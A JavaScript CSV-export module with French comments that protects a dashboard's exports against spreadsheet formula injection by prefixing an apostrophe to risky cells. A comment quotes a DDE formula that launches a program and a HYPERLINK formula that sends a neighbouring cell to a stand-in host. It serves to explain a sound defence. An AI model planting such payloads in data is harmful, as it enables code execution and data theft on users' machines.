// ---------------------------------------------------------------------------
// LE FORMAT CSV, ECRIT UNE SEULE FOIS
//
// Les deux exports du tableau de bord (les clients, les rendez-vous) passent
// par ici, et rien d'autre ne fabrique de CSV dans ce projet. C'est ce qui
// permet a la protection contre les formules ci-dessous d'etre vraie partout :
// la colonne d'origine utilisateur ajoutee demain sera protegee sans que
// personne n'ait a y penser.
//
// A PART DE src/routes/tableaudebord.js, ET PAS PAR GOUT DU RANGEMENT : une
// regle qui protege d'une injection doit pouvoir etre eprouvee seule. Passer
// par le serveur ne le permettait pas — les noms sont coupes de leurs espaces
// a la saisie (`texte()`, src/lib/settings.js), si bien qu'une valeur
// commencant par une tabulation n'arrive JAMAIS jusqu'a l'export par cette
// route-la. Elle peut arriver par une autre (une base reprise d'ailleurs, une
// route ecrite plus tard), et c'est exactement ce contre quoi on se protege.
// ---------------------------------------------------------------------------
/**
 * Les premiers caracteres qu'un tableur lit comme le debut d'une FORMULE.
 *
 * `=`, `+`, `-` et `@` ouvrent un calcul dans Excel, LibreOffice et Google
 * Sheets. La tabulation et le retour chariot sont la parce qu'ils sont ignores
 * a la lecture : « <TAB>=1+1 » redevient « =1+1 » une fois dans la cellule.
 */
export const DEBUT_DE_FORMULE = /^[=+\-@\t\r]/;

/**
 * Une cellule de CSV, au format qu'Excel comprend.
 *
 * Guillemets doubles autour de tout, guillemets internes doubles. On n'essaie
 * pas de deviner ce qui a besoin d'etre protege : un nom peut contenir un
 * point-virgule, une note un saut de ligne, et un tarif une virgule decimale.
 *
 * >>> ET UNE APOSTROPHE DEVANT CE QUI RESSEMBLE A UNE FORMULE. <<<
 *
 * LE POINT D'ENTREE EST PUBLIC. Le champ « Prenom et nom » du tunnel accepte
 * n'importe quoi, de n'importe qui, depuis Internet. Un client nomme `=1+1`
 * ressortait tel quel — premier caractere `=`, mesure sur l'instance en
 * ligne — et le tableur du commercant executait le calcul a l'ouverture. Ce
 * n'est pas une curiosite d'affichage : `=cmd|'/c calc'!A1` lance un
 * programme, `=HYPERLINK("http://exemple/"&A1,"Cliquez")` emporte la ligne
 * d'a cote vers un site tiers. Le fichier est ouvert par le commercant, sur sa
 * machine, avec ses droits : c'est lui la victime, pas le site.
 *
 * L'apostrophe est posee AVANT la mise entre guillemets — c'est la convention
 * que les tableurs comprennent (« ceci est du texte »), elle ne s'affiche pas
 * dans la cellule, et elle ne touche a rien d'ordinaire : un numero francais
 * commence par un zero, un tarif par un chiffre, une date par un chiffre.
 *
 * >>> UNE SEULE FONCTION, PAS UNE PAR EXPORT. <<< Les deux exports passent par
 * `ligneCsv()`, qui passe par ici. La colonne d'origine utilisateur ajoutee
 * demain sera protegee sans que personne n'ait a y penser.
 */
export function cellule(valeur) {
  const brut = String(valeur ?? '');
  const protege = DEBUT_DE_FORMULE.test(brut) ? `'${brut}` : brut;
  return `"${protege.replaceAll('"', '""')}"`;
}

export function ligneCsv(valeurs) {
  return valeurs.map(cellule).join(';');
}

/**
 * Le fichier complet, pret a etre ouvert par un tableur francais.
 *
 * DEUX DETAILS QUI DECIDENT DE TOUT, et qui ne se voient qu'a l'ouverture :
 *
 *   - LE SEPARATEUR EST LE POINT-VIRGULE. Excel en configuration francaise lit
 *     la virgule comme separateur decimal ; un CSV « comma-separated » y arrive
 *     en une seule colonne, et le commercant conclut que l'export est casse.
 *
 *   - LE FICHIER COMMENCE PAR UN BOM UTF-8 (﻿). Sans lui, Excel suppose
 *     l'encodage de la machine et affiche « RÃ©mi » au lieu de « Rémi ». Le
 *     fichier serait pourtant parfaitement valide — c'est le genre de bogue
 *     qu'on ne voit jamais en le testant sous Linux.
 *
 * Les fins de ligne sont en CRLF, ce qu'attendent les tableurs sous Windows.
 */
export function fichierCsv(entetes, lignes) {
  return '﻿' + [ligneCsv(entetes), ...lignes.map(ligneCsv)].join('\r\n') + '\r\n';
}
